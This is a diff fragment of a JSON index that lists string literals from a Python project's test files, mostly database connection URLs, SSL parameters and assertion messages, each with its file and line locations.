       "category": "test_literals",
       "locations": [
         "auth_service/tests/config/test_env.py:58",
-        "auth_service/tests/conftest.py:15",
+        "auth_service/tests/conftest.py:28",
         "auth_service/tests/test_critical_staging_issues.py:80",
         "auth_service/tests/test_database_manager.py:155",
         "auth_service/tests/test_single_database.py:39",
@@ -27712,6 +28144,13 @@
         "scripts/fix_test_batch.py:392"
       ]
     },
+    "for input": {
+      "value": "for input",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:305"
+      ]
+    },
     "for splitting opportunities...": {
       "value": "for splitting opportunities...",
       "category": "test_literals",
@@ -27863,8 +28302,8 @@
         "scripts/fix_test_import_errors.py:58"
       ]
     },
-    "from netra_backend.app.websocket.unified.manager import UnifiedWebSocketManager": {
-      "value": "from netra_backend.app.websocket.unified.manager import UnifiedWebSocketManager",
+    "from netra_backend.app.websocket_core.manager import WebSocketManager as UnifiedWebSocketManager": {
+      "value": "from netra_backend.app.websocket_core.manager import WebSocketManager as UnifiedWebSocketManager",
       "category": "test_literals",
       "locations": [
         "scripts/compliance/test_fixer.py:52"
@@ -28587,7 +29026,6 @@
       "value": "function",
       "category": "test_literals",
       "locations": [
-        "auth_service/tests/conftest.py:142",
         "scripts/check_test_compliance.py:58",
         "scripts/check_test_compliance.py:177",
         "scripts/comprehensive_test_fixer.py:215",
@@ -28817,17 +29255,35 @@
       "value": "get_auth_database_url_async",
       "category": "test_literals",
       "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:30",
+        "auth_service/tests/test_auth_database_manager_missing_method.py:34",
+        "auth_service/tests/test_auth_database_manager_missing_method.py:340",
         "auth_service/tests/test_critical_staging_issues.py:35",
         "auth_service/tests/test_critical_staging_issues.py:39",
         "auth_service/tests/test_critical_staging_issues.py:61",
         "auth_service/tests/test_critical_staging_issues.py:84"
       ]
     },
+    "get_auth_database_url_async must be callable": {
+      "value": "get_auth_database_url_async must be callable",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:35"
+      ]
+    },
     "get_auth_database_url_async should be callable": {
       "value": "get_auth_database_url_async should be callable",
       "category": "test_literals",
       "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:344",
         "auth_service/tests/test_critical_staging_issues.py:40"
+      ]
+    },
+    "get_auth_database_url_async should return string": {
+      "value": "get_auth_database_url_async should return string",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:276"
       ]
     },
     "git": {
@@ -28883,7 +29339,7 @@
       "locations": [
         "auth_service/tests/base/test_mixins.py:196",
         "auth_service/tests/base/test_mixins.py:203",
-        "auth_service/tests/conftest.py:139",
+        "auth_service/tests/conftest.py:146",
         "auth_service/tests/integration/test_auth_oauth_google.py:380",
         "auth_service/tests/integration/test_auth_oauth_google.py:384",
         "auth_service/tests/integration/test_oauth_flows_sync.py:127",
@@ -29456,6 +29912,13 @@
       "category": "test_literals",
       "locations": [
         "scripts/test_cold_start_e2e.py:457"
+      ]
+    },
+    "http://example.com": {
+      "value": "http://example.com",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:134"
       ]
     },
     "http://localhost": {
@@ -30434,11 +30897,83 @@
         "auth_service/tests/utils/assertion_helpers.py:120"
       ]
     },
+    "is_cloud_sql_environment": {
+      "value": "is_cloud_sql_environment",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:152",
+        "auth_service/tests/test_auth_database_manager_missing_method.py:155",
+        "auth_service/tests/test_auth_database_manager_missing_method.py:356"
+      ]
+    },
+    "is_cloud_sql_environment must be callable": {
+      "value": "is_cloud_sql_environment must be callable",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:156"
+      ]
+    },
+    "is_cloud_sql_environment should be callable": {
+      "value": "is_cloud_sql_environment should be callable",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:359"
+      ]
+    },
+    "is_cloud_sql_environment should return boolean": {
+      "value": "is_cloud_sql_environment should return boolean",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:283"
+      ]
+    },
+    "is_cloud_sql_environment should return boolean, got:": {
+      "value": "is_cloud_sql_environment should return boolean, got:",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:169",
+        "auth_service/tests/test_auth_database_manager_missing_method.py:184"
+      ]
+    },
     "is_test_environment": {
       "value": "is_test_environment",
       "category": "test_literals",
       "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:195",
+        "auth_service/tests/test_auth_database_manager_missing_method.py:198",
+        "auth_service/tests/test_auth_database_manager_missing_method.py:357",
         "auth_service/tests/test_postgres_compliance.py:216"
+      ]
+    },
+    "is_test_environment must be callable": {
+      "value": "is_test_environment must be callable",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:199"
+      ]
+    },
+    "is_test_environment should be callable": {
+      "value": "is_test_environment should be callable",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:360"
+      ]
+    },
+    "is_test_environment should return boolean": {
+      "value": "is_test_environment should return boolean",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:284"
+      ]
+    },
+    "is_test_environment should return boolean, got:": {
+      "value": "is_test_environment should return boolean, got:",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:212",
+        "auth_service/tests/test_auth_database_manager_missing_method.py:227",
+        "auth_service/tests/test_auth_database_manager_missing_method.py:242",
+        "auth_service/tests/test_auth_database_manager_missing_method.py:257"
       ]
     },
     "is_verified": {
@@ -31163,7 +31698,15 @@
       "value": "localhost:5432",
       "category": "test_literals",
       "locations": [
-        "auth_service/tests/test_cloud_sql_url.py:87"
+        "auth_service/tests/test_cloud_sql_url.py:87",
+        "shared/database/tests/test_core_database_manager.py:165"
+      ]
+    },
+    "localhost:5432/auth_db": {
+      "value": "localhost:5432/auth_db",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:53"
       ]
     },
     "location": {
@@ -32103,11 +32646,18 @@
         "scripts/standardize_l3_test_names.py:133"
       ]
     },
+    "mysql://user:pass@host:3306/db": {
+      "value": "mysql://user:pass@host:3306/db",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:132"
+      ]
+    },
     "name": {
       "value": "name",
       "category": "test_literals",
       "locations": [
-        "auth_service/tests/conftest.py:138",
+        "auth_service/tests/conftest.py:145",
         "auth_service/tests/factories/token_factory.py:225",
         "auth_service/tests/integration/test_auth_oauth_errors.py:56",
         "auth_service/tests/integration/test_auth_oauth_google.py:48",
@@ -32147,7 +32697,8 @@
       "value": "netra",
       "category": "test_literals",
       "locations": [
-        "scripts/test_async_postgres.py:147"
+        "scripts/test_async_postgres.py:147",
+        "shared/database/tests/test_core_database_manager.py:166"
       ]
     },
     "netra-ai-staging": {
@@ -32241,6 +32792,7 @@
       "value": "netra-staging",
       "category": "test_literals",
       "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:268",
         "scripts/test_staging_config.py:44"
       ]
     },
@@ -32455,6 +33007,13 @@
         "scripts/test_async_postgres.py:147"
       ]
     },
+    "netra_staging": {
+      "value": "netra_staging",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:176"
+      ]
+    },
     "network_partition": {
       "value": "network_partition",
       "category": "test_literals",
@@ -32638,6 +33197,13 @@
         "scripts/startup_test_executor.py:235"
       ]
     },
+    "not configured": {
+      "value": "not configured",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:100"
+      ]
+    },
     "not found": {
       "value": "not found",
       "category": "test_literals",
@@ -32660,6 +33226,13 @@
       "category": "test_literals",
       "locations": [
         "auth_service/tests/test_security.py:562"
+      ]
+    },
+    "not-a-url": {
+      "value": "not-a-url",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:315"
       ]
     },
     "not.a.token": {
@@ -33110,6 +33683,13 @@
         "scripts/test_backend_optimized.py:168"
       ]
     },
+    "parameter": {
+      "value": "parameter",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:185"
+      ]
+    },
     "parametrize": {
       "value": "parametrize",
       "category": "test_literals",
@@ -33551,6 +34131,41 @@
         "scripts/test_async_postgres.py:140"
       ]
     },
+    "postgres+asyncpg://host/db": {
+      "value": "postgres+asyncpg://host/db",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:182"
+      ]
+    },
+    "postgres://": {
+      "value": "postgres://",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:309"
+      ]
+    },
+    "postgres://host/db": {
+      "value": "postgres://host/db",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:183"
+      ]
+    },
+    "postgres://netra_user:password@/postgres?host=/cloudsql/instance&sslmode=require": {
+      "value": "postgres://netra_user:password@/postgres?host=/cloudsql/instance&sslmode=require",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:293"
+      ]
+    },
+    "postgres://user:pass@/db?host=/cloudsql/instance&sslmode=prefer": {
+      "value": "postgres://user:pass@/db?host=/cloudsql/instance&sslmode=prefer",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:73"
+      ]
+    },
     "postgres://user:pass@host.com:5432/dbname": {
       "value": "postgres://user:pass@host.com:5432/dbname",
       "category": "test_literals",
@@ -33563,7 +34178,9 @@
       "category": "test_literals",
       "locations": [
         "auth_service/tests/test_postgres_compliance.py:38",
-        "auth_service/tests/test_postgres_compliance.py:53"
+        "auth_service/tests/test_postgres_compliance.py:53",
+        "shared/database/tests/test_core_database_manager.py:20",
+        "shared/database/tests/test_core_database_manager.py:123"
       ]
     },
     "postgres://user:pass@localhost/db": {
@@ -33595,13 +34212,20 @@
         "auth_service/tests/database/test_config.py:109",
         "auth_service/tests/database/test_config.py:121",
         "auth_service/tests/database/test_config.py:146",
+        "auth_service/tests/test_auth_database_manager_missing_method.py:49",
+        "auth_service/tests/test_auth_database_manager_missing_method.py:85",
         "auth_service/tests/test_cloud_sql_url.py:36",
         "auth_service/tests/test_cloud_sql_url.py:63",
         "auth_service/tests/test_cloud_sql_url.py:86",
         "auth_service/tests/test_cloud_sql_url.py:107",
-        "auth_service/tests/test_critical_staging_issues.py:50",
-        "auth_service/tests/test_database_manager.py:62",
-        "auth_service/tests/test_database_manager.py:74"
+        "auth_service/tests/test_critical_staging_issues.py:50"
+      ]
+    },
+    "postgresql+asyncpg://host/db": {
+      "value": "postgresql+asyncpg://host/db",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:181"
       ]
     },
     "postgresql+asyncpg://netra_staging:password@35.223.209.195:5432/netra_staging": {
@@ -33609,6 +34233,13 @@
       "category": "test_literals",
       "locations": [
         "auth_service/tests/test_postgres_compliance.py:210"
+      ]
+    },
+    "postgresql+asyncpg://netra_user:password@/postgres?host=/cloudsql/instance": {
+      "value": "postgresql+asyncpg://netra_user:password@/postgres?host=/cloudsql/instance",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:296"
       ]
     },
     "postgresql+asyncpg://postgres:": {
@@ -33659,14 +34290,16 @@
         "auth_service/tests/test_postgres_compliance.py:41",
         "auth_service/tests/test_postgres_compliance.py:52",
         "auth_service/tests/test_postgres_compliance.py:80",
-        "auth_service/tests/test_postgres_compliance.py:110"
+        "auth_service/tests/test_postgres_compliance.py:110",
+        "shared/database/tests/test_core_database_manager.py:26"
       ]
     },
     "postgresql+asyncpg://user:pass@host:5432/db?ssl=require": {
       "value": "postgresql+asyncpg://user:pass@host:5432/db?ssl=require",
       "category": "test_literals",
       "locations": [
-        "auth_service/tests/test_postgres_compliance.py:81"
+        "auth_service/tests/test_postgres_compliance.py:81",
+        "shared/database/tests/test_core_database_manager.py:100"
       ]
     },
     "postgresql+asyncpg://user:pass@host:5432/db?sslmode=require": {
@@ -33730,10 +34363,73 @@
       "value": "postgresql://",
       "category": "test_literals",
       "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:316",
         "auth_service/tests/test_database_manager.py:33",
         "auth_service/tests/test_database_manager.py:48",
         "auth_service/tests/test_database_manager.py:182",
-        "auth_service/tests/test_database_manager.py:197"
+        "auth_service/tests/test_database_manager.py:197",
+        "shared/database/tests/test_core_database_manager.py:102"
+      ]
+    },
+    "postgresql://host/db": {
+      "value": "postgresql://host/db",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:181",
+        "shared/database/tests/test_core_database_manager.py:182",
+        "shared/database/tests/test_core_database_manager.py:183",
+        "shared/database/tests/test_core_database_manager.py:184",
+        "shared/database/tests/test_core_database_manager.py:184",
+        "shared/database/tests/test_core_database_manager.py:200"
+      ]
+    },
+    "postgresql://host/db?ssl=require": {
+      "value": "postgresql://host/db?ssl=require",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:198"
+      ]
+    },
+    "postgresql://host/db?ssl=require&sslmode=disable": {
+      "value": "postgresql://host/db?ssl=require&sslmode=disable",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:192"
+      ]
+    },
+    "postgresql://host/db?sslmode=require": {
+      "value": "postgresql://host/db?sslmode=require",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:199"
+      ]
+    },
+    "postgresql://netra_user:$(STAGING_DB_PASSWORD)@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require": {
+      "value": "postgresql://netra_user:$(STAGING_DB_PASSWORD)@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:152"
+      ]
+    },
+    "postgresql://netra_user:secret_password@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require": {
+      "value": "postgresql://netra_user:secret_password@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:230"
+      ]
+    },
+    "postgresql://netra_user:staging_pass@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require": {
+      "value": "postgresql://netra_user:staging_pass@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:266"
+      ]
+    },
+    "postgresql://netra_user:staging_password@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require": {
+      "value": "postgresql://netra_user:staging_password@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:43"
       ]
     },
     "postgresql://test:test@localhost:5432/netra_test": {
@@ -33743,11 +34439,41 @@
         "scripts/test_backend.py:79"
       ]
     },
+    "postgresql://test:test@localhost:5432/test": {
+      "value": "postgresql://test:test@localhost:5432/test",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:109"
+      ]
+    },
     "postgresql://test:test@localhost:5432/test_db": {
       "value": "postgresql://test:test@localhost:5432/test_db",
       "category": "test_literals",
       "locations": [
         "auth_service/tests/test_single_database.py:99"
+      ]
+    },
+    "postgresql://user:pass@/db?host=/cloudsql/instance&ssl=require": {
+      "value": "postgresql://user:pass@/db?host=/cloudsql/instance&ssl=require",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:71"
+      ]
+    },
+    "postgresql://user:pass@/db?host=/cloudsql/instance&sslmode=disable": {
+      "value": "postgresql://user:pass@/db?host=/cloudsql/instance&sslmode=disable",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:72"
+      ]
+    },
+    "postgresql://user:pass@/db?host=/cloudsql/instance&sslmode=require": {
+      "value": "postgresql://user:pass@/db?host=/cloudsql/instance&sslmode=require",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:70",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:131",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:202"
       ]
     },
     "postgresql://user:pass@/db?host=/cloudsql/project:region:instance": {
@@ -33786,13 +34512,65 @@
         "auth_service/tests/test_database_manager.py:187"
       ]
     },
+    "postgresql://user:pass@host/cloudsql/project:region:instance/db": {
+      "value": "postgresql://user:pass@host/cloudsql/project:region:instance/db",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:42",
+        "shared/database/tests/test_core_database_manager.py:61",
+        "shared/database/tests/test_core_database_manager.py:82"
+      ]
+    },
+    "postgresql://user:pass@host/cloudsql/project:region:instance/db?ssl=require": {
+      "value": "postgresql://user:pass@host/cloudsql/project:region:instance/db?ssl=require",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:78"
+      ]
+    },
+    "postgresql://user:pass@host/cloudsql/project:region:instance/db?sslmode=require&ssl=disable": {
+      "value": "postgresql://user:pass@host/cloudsql/project:region:instance/db?sslmode=require&ssl=disable",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:57"
+      ]
+    },
     "postgresql://user:pass@host:5432/db": {
       "value": "postgresql://user:pass@host:5432/db",
       "category": "test_literals",
       "locations": [
         "auth_service/tests/test_postgres_compliance.py:37",
         "auth_service/tests/test_postgres_compliance.py:54",
-        "auth_service/tests/test_postgres_compliance.py:102"
+        "auth_service/tests/test_postgres_compliance.py:102",
+        "shared/database/tests/test_core_database_manager.py:22",
+        "shared/database/tests/test_core_database_manager.py:28",
+        "shared/database/tests/test_core_database_manager.py:47",
+        "shared/database/tests/test_core_database_manager.py:74",
+        "shared/database/tests/test_core_database_manager.py:122"
+      ]
+    },
+    "postgresql://user:pass@host:5432/db?ssl=require": {
+      "value": "postgresql://user:pass@host:5432/db?ssl=require",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:67",
+        "shared/database/tests/test_core_database_manager.py:86"
+      ]
+    },
+    "postgresql://user:pass@host:5432/db?sslmode=prefer": {
+      "value": "postgresql://user:pass@host:5432/db?sslmode=prefer",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:71"
+      ]
+    },
+    "postgresql://user:pass@host:5432/db?sslmode=require": {
+      "value": "postgresql://user:pass@host:5432/db?sslmode=require",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:65",
+        "shared/database/tests/test_core_database_manager.py:88",
+        "shared/database/tests/test_core_database_manager.py:92"
       ]
     },
     "postgresql://user:pass@localhost/db": {
@@ -33849,6 +34627,20 @@
       "category": "test_literals",
       "locations": [
         "auth_service/tests/test_cloud_sql_url.py:49"
+      ]
+    },
+    "postgresql://user:pass@staging-db:5432/db?sslmode=require": {
+      "value": "postgresql://user:pass@staging-db:5432/db?sslmode=require",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:99"
+      ]
+    },
+    "postgresql://user@": {
+      "value": "postgresql://user@",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:317"
       ]
     },
     "postgres|PostgreSQL|psycopg": {
@@ -34041,7 +34833,7 @@
       "value": "provider",
       "category": "test_literals",
       "locations": [
-        "auth_service/tests/conftest.py:139",
+        "auth_service/tests/conftest.py:146",
         "auth_service/tests/factories/user_factory.py:85",
         "auth_service/tests/test_security.py:142",
         "auth_service/tests/test_security.py:154",
@@ -34085,6 +34877,7 @@
       "value": "pytest",
       "category": "test_literals",
       "locations": [
+        "auth_service/tests/conftest.py:26",
         "auth_service/tests/test_database_manager.py:158",
         "scripts/analyze_test_overlap.py:218",
         "scripts/analyze_test_overlap.py:219",
@@ -34093,8 +34886,7 @@
         "scripts/business_value_test_index.py:232",
         "scripts/business_value_test_index.py:244",
         "scripts/cleanup_test_processes.py:80",
-        "scripts/compliance/test_refactor_helper.py:315",
-        "scripts/compliance/test_size_validator.py:267"
+        "scripts/compliance/test_refactor_helper.py:315"
       ]
     },
     "pytest-asyncio": {
@@ -34461,6 +35253,13 @@
         "scripts/business_value_test_index.py:747"
       ]
     },
+    "real_password": {
+      "value": "real_password",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:157"
+      ]
+    },
     "real_services": {
       "value": "real_services",
       "category": "test_literals",
@@ -34622,7 +35421,7 @@
       "value": "redis://localhost:6379/1",
       "category": "test_literals",
       "locations": [
-        "auth_service/tests/conftest.py:21",
+        "auth_service/tests/conftest.py:34",
         "scripts/test_backend.py:81"
       ]
     },
@@ -36095,7 +36894,7 @@
       "value": "sqlite+aiosqlite:///test_auth.db",
       "category": "test_literals",
       "locations": [
-        "auth_service/tests/conftest.py:19"
+        "auth_service/tests/conftest.py:32"
       ]
     },
     "sqlite://": {
@@ -36105,35 +36904,97 @@
         "auth_service/tests/test_database_manager.py:182"
       ]
     },
+    "sqlite:///:memory:": {
+      "value": "sqlite:///:memory:",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:171"
+      ]
+    },
+    "sqlite:///test.db": {
+      "value": "sqlite:///test.db",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:133"
+      ]
+    },
+    "ssl": {
+      "value": "ssl",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:185"
+      ]
+    },
+    "ssl parameter missing for regular connection": {
+      "value": "ssl parameter missing for regular connection",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:115"
+      ]
+    },
     "ssl=": {
       "value": "ssl=",
       "category": "test_literals",
       "locations": [
         "auth_service/tests/test_database_manager.py:41",
         "auth_service/tests/test_database_manager.py:56",
-        "auth_service/tests/test_database_manager.py:82"
+        "auth_service/tests/test_database_manager.py:82",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:55",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:82",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:114",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:173",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:176",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:282",
+        "shared/database/tests/test_core_database_manager.py:60"
       ]
     },
     "ssl=require": {
       "value": "ssl=require",
       "category": "test_literals",
       "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:67",
         "auth_service/tests/test_cloud_sql_url.py:65",
         "auth_service/tests/test_database_manager.py:72",
         "auth_service/tests/test_database_manager.py:201",
-        "auth_service/tests/test_postgres_compliance.py:67"
+        "auth_service/tests/test_postgres_compliance.py:67",
+        "shared/database/tests/test_core_database_manager.py:95"
+      ]
+    },
+    "sslcert=": {
+      "value": "sslcert=",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:82"
+      ]
+    },
+    "sslkey=": {
+      "value": "sslkey=",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:82"
+      ]
+    },
+    "sslmode not converted to ssl": {
+      "value": "sslmode not converted to ssl",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:112"
       ]
     },
     "sslmode=": {
       "value": "sslmode=",
       "category": "test_literals",
       "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:69",
         "auth_service/tests/test_cloud_sql_url.py:66",
         "auth_service/tests/test_database_manager.py:40",
         "auth_service/tests/test_database_manager.py:73",
         "auth_service/tests/test_database_manager.py:81",
         "auth_service/tests/test_database_manager.py:202",
-        "auth_service/tests/test_postgres_compliance.py:68"
+        "auth_service/tests/test_postgres_compliance.py:68",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:54",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:82",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:111"
       ]
     },
     "sslmode=require": {
@@ -36142,7 +37003,15 @@
       "locations": [
         "auth_service/tests/test_database_manager.py:55",
         "auth_service/tests/test_database_manager.py:196",
-        "auth_service/tests/test_postgres_compliance.py:74"
+        "auth_service/tests/test_postgres_compliance.py:74",
+        "shared/database/tests/test_core_database_manager.py:104"
+      ]
+    },
+    "sslrootcert=": {
+      "value": "sslrootcert=",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:82"
       ]
     },
     "stable_with_noise": {
@@ -36712,7 +37581,7 @@
         "auth_service/tests/config/test_env.py:21",
         "auth_service/tests/config/test_env.py:149",
         "auth_service/tests/config/test_settings.py:88",
-        "auth_service/tests/conftest.py:14",
+        "auth_service/tests/conftest.py:27",
         "auth_service/tests/test_auth_token_generation.py:240",
         "auth_service/tests/test_auth_token_security.py:345",
         "auth_service/tests/test_auth_token_validation.py:97",
@@ -37193,7 +38062,7 @@
       "value": "test@example.com",
       "category": "test_literals",
       "locations": [
-        "auth_service/tests/conftest.py:137",
+        "auth_service/tests/conftest.py:144",
         "auth_service/tests/integration/test_auth_oauth_errors.py:55",
         "auth_service/tests/integration/test_auth_oauth_google.py:47",
         "auth_service/tests/integration/test_oauth_comprehensive_failures.py:221",
@@ -37540,7 +38409,7 @@
       "value": "test_google_client_id",
       "category": "test_literals",
       "locations": [
-        "auth_service/tests/conftest.py:17",
+        "auth_service/tests/conftest.py:30",
         "auth_service/tests/test_setup.py:47"
       ]
     },
@@ -37548,7 +38417,7 @@
       "value": "test_google_client_secret",
       "category": "test_literals",
       "locations": [
-        "auth_service/tests/conftest.py:18"
+        "auth_service/tests/conftest.py:31"
       ]
     },
     "test_history.json": {
@@ -37570,7 +38439,7 @@
       "category": "test_literals",
       "locations": [
         "auth_service/debug_db_test.py:11",
-        "auth_service/tests/conftest.py:16"
+        "auth_service/tests/conftest.py:29"
       ]
     },
     "test_message": {
@@ -37802,7 +38671,7 @@
       "value": "test_user_123",
       "category": "test_literals",
       "locations": [
-        "auth_service/tests/conftest.py:136",
+        "auth_service/tests/conftest.py:143",
         "auth_service/tests/integration/test_auth_oauth_errors.py:54",
         "auth_service/tests/integration/test_oauth_comprehensive_failures.py:220",
         "auth_service/tests/integration/test_oauth_comprehensive_failures.py:363",
@@ -38821,7 +39690,7 @@
         "auth_service/tests/config/test_env.py:50",
         "auth_service/tests/config/test_env.py:175",
         "auth_service/tests/config/test_env.py:185",
-        "auth_service/tests/conftest.py:20",
+        "auth_service/tests/conftest.py:33",
         "auth_service/tests/test_database_manager.py:152",
         "auth_service/tests/test_postgres_compliance.py:127",
         "auth_service/tests/test_postgres_compliance.py:180",
@@ -38970,6 +39839,13 @@
         "scripts/fix_all_test_issues.py:240"
       ]
     },
+    "unrecognized": {
+      "value": "unrecognized",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:185"
+      ]
+    },
     "unverified@example.com": {
       "value": "unverified@example.com",
       "category": "test_literals",
@@ -38995,6 +39871,7 @@
       "value": "url",
       "category": "test_literals",
       "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:331",
         "scripts/test_cold_start_e2e.py:195",
         "scripts/test_cold_start_e2e.py:196",
         "scripts/test_cold_start_e2e.py:436",
@@ -39414,7 +40291,39 @@
       "value": "validate_auth_url",
       "category": "test_literals",
       "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:109",
+        "auth_service/tests/test_auth_database_manager_missing_method.py:112",
+        "auth_service/tests/test_auth_database_manager_missing_method.py:348",
         "auth_service/tests/test_critical_staging_issues.py:64"
+      ]
+    },
+    "validate_auth_url must be callable": {
+      "value": "validate_auth_url must be callable",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:113"
+      ]
+    },
+    "validate_auth_url should be callable": {
+      "value": "validate_auth_url should be callable",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:352"
+      ]
+    },
+    "validate_auth_url should return boolean": {
+      "value": "validate_auth_url should return boolean",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:272"
+      ]
+    },
+    "validate_auth_url should return boolean, got:": {
+      "value": "validate_auth_url should return boolean, got:",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:126",
+        "auth_service/tests/test_auth_database_manager_missing_method.py:141"
       ]
     },
     "validation_test": {
